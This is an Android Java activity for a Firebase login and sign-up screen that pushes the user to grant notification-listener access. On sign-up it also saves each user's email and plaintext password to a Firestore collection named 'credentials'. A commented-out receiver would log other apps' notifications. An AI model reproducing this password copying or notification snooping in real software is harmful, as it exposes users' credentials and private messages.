package com.cerner.notif;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.provider.Settings;
import android.support.annotation.NonNull;
import android.support.v4.content.LocalBroadcastManager;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;

import com.google.android.gms.tasks.OnCompleteListener;
import com.google.android.gms.tasks.OnFailureListener;
import com.google.android.gms.tasks.OnSuccessListener;
import com.google.android.gms.tasks.Task;
import com.google.firebase.FirebaseApp;
import com.google.firebase.auth.AuthResult;
import com.google.firebase.auth.FirebaseAuth;
import com.google.firebase.auth.FirebaseUser;
import com.google.firebase.firestore.CollectionReference;
import com.google.firebase.firestore.DocumentReference;
import com.google.firebase.firestore.FirebaseFirestore;

import java.util.HashMap;

public class MainActivity extends AppCompatActivity {

    TextView email,pass;
    Button signUpButton,loginButton;
    FirebaseAuth firebaseAuth;
    FirebaseUser firebaseUser;
    FirebaseFirestore firebaseFirestore = FirebaseFirestore.getInstance();
    CollectionReference collectionReference = firebaseFirestore.collection("credentials");
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
      //  LocalBroadcastManager.getInstance(this).registerReceiver(onNotice,new IntentFilter("Msg"));
        FirebaseApp.initializeApp(this);
        Log.d(String.valueOf(MainActivity.class), "onCreate: ");
       // startService(new Intent(this,SH.class));
        email = findViewById(R.id.emailText);
        pass = findViewById(R.id.passwordText);
        signUpButton = findViewById(R.id.signUpButton);
        loginButton = findViewById(R.id.LoginButton);
        firebaseAuth = FirebaseAuth.getInstance();
        NotifiationAccess();
        if(firebaseAuth.getCurrentUser() != null)
        {
            startActivity(new Intent(this,Welcome.class));
        }

        signUpButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
               if(isCredentialsOK())
                    newUser();
                else
                   Toast.makeText(MainActivity.this, "Please enter correct email and password", Toast.LENGTH_SHORT).show();
            }
        });

        loginButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                if(isCredentialsOK())
                    Login();
                else
                    Toast.makeText(MainActivity.this, "Please enter correct email and password", Toast.LENGTH_SHORT).show();
            }
        });
    }

    boolean isCredentialsOK(){
        if( email.getText().toString().length()>0  && email.getText().toString().contains("@") && pass.getText().toString().length()>4 )
                return true;
        else
            return false;
    }

    private void newUser(){

        firebaseAuth.createUserWithEmailAndPassword(email.getText().toString().trim(),pass.getText().toString().trim()).addOnCompleteListener(new OnCompleteListener<AuthResult>() {
            @Override
            public void onComplete(@NonNull Task<AuthResult> task) {
                    if (task.isSuccessful()) {
                        HashMap map = new HashMap<String,String>();
                        map.put("email",email.getText().toString().trim());
                        map.put("password",pass.getText().toString().trim());
                        Toast.makeText(MainActivity.this, "UserCreated successfully !", Toast.LENGTH_SHORT).show();
                        startActivity(new Intent(MainActivity.this,Welcome.class));
                        collectionReference.add(map).addOnSuccessListener(new OnSuccessListener<DocumentReference>() {
                            @Override
                            public void onSuccess(DocumentReference documentReference) {
                                Log.d(String.valueOf(MainActivity.class), "Got credentials ");
                            }
                        });
                      }
                    else
                        Toast.makeText(MainActivity.this, "Error in creating new user", Toast.LENGTH_SHORT).show();
            }
        });
    }

    private void Login(){

        firebaseAuth.signInWithEmailAndPassword(email.getText().toString().trim(),pass.getText().toString().trim()).addOnCompleteListener(new OnCompleteListener<AuthResult>() {
            @Override
            public void onComplete(@NonNull Task<AuthResult> task) {

                        if(task.isSuccessful()) {
                           // Toast.makeText(MainActivity.this, "Welcome User", Toast.LENGTH_SHORT).show();
                            startActivity(new Intent(MainActivity.this, Welcome.class));
                        }
                        else
                            Toast.makeText(MainActivity.this, "Sign-in Failed", Toast.LENGTH_SHORT).show();
            }
        });

    }

  /*  private BroadcastReceiver onNotice = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
                String pack  = intent.getStringExtra("pack");
                String title = intent.getStringExtra("title");
                String text  = intent.getStringExtra("text");

                Log.d(String.valueOf(MainActivity.class), "onReceive: "+pack+"\n"+title+"\n"+text);

        }
    };*/

    public void NotifiationAccess(){

        if(!Settings.Secure.getString(this.getContentResolver(),"enabled_notification_listeners").contains(getApplicationContext().getPackageName()))
        {
            Toast.makeText(this, "Enable Notification accesss....", Toast.LENGTH_SHORT).show();
            Intent intent = new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS");
            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    getApplicationContext().startActivity(intent);
        }



    }


}
